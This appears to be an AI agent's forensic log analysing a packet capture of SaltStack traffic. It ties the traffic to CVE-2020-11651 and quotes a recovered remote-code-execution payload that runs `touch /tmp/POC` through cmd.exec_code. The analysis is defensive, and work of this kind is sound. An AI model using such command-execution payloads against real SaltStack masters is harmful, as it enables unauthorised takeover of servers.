[Task 13]
Step 1: To begin the analysis of the PCAP file, I need to extract detailed information about the traffic, such as the protocols used, any application layer data, and any anomalies or patterns that might indicate the service or application involved. This will help in identifying the service or application and any potential vulnerabilities.

Let's start by extracting the application layer data and any relevant protocol information from the PCAP file. This will provide insights into the service or application involved.

I'll proceed with this task.
Step 2: Final report from the forensic expert:
The analysis of the PCAP file revealed communication over TCP between ports 34736 and 4506, with port 4506 being associated with the SaltStack service. The extracted payload data from the TCP stream on port 4506 included several hexadecimal strings that were translated into ASCII. The ASCII translation revealed SaltStack operations, including commands like 'cmd.ping' and 'cmd.exec_code' with a Python code execution attempt. This confirms the presence of SaltStack service activity and potential exploitation attempts.
Executed command: -Y "tcp.port == 4506" -T fields -e data

Command output:

The extracted payload data from the TCP stream on port 4506 included SaltStack operations and potential exploitation attempts, such as 'cmd.ping' and 'cmd.exec_code' with a Python code execution attempt.

Now, I need to identify the relevant CVE associated with this type of activity. I will perform a web search to find CVEs related to SaltStack, particularly those involving remote code execution or command execution vulnerabilities.

Step 7: The analysis of the PCAP file has revealed communication over TCP between ports 34736 and 4506, with port 4506 being associated with the SaltStack service. The extracted payload data from the TCP stream on port 4506 included SaltStack operations and potential exploitation attempts, such as 'cmd.ping' and 'cmd.exec_code' with a Python code execution attempt. This indicates potential exploitation of the SaltStack service.

The web search results have identified CVE-2020-11651 as a relevant vulnerability associated with SaltStack, involving unauthenticated remote code execution.

Next, I need to gather evidence of malicious activities associated with CVE-2020-11651 from the PCAP file. I will instruct the "tshark_expert" to look for signs of remote code execution attempts, such as unusual command execution patterns or unauthorized access attempts, in the network traffic.
Step 8: Final report from the forensic expert:
The analysis of the payload data from the packets with the PSH flag revealed a potential remote code execution attempt. The ASCII translation of the payload data showed a command execution attempt using Python's subprocess module: `subprocess.call('touch /tmp/POC',shell=True)`. This indicates an unauthorized attempt to create a file named 'POC' in the '/tmp' directory, which is a sign of remote code execution.
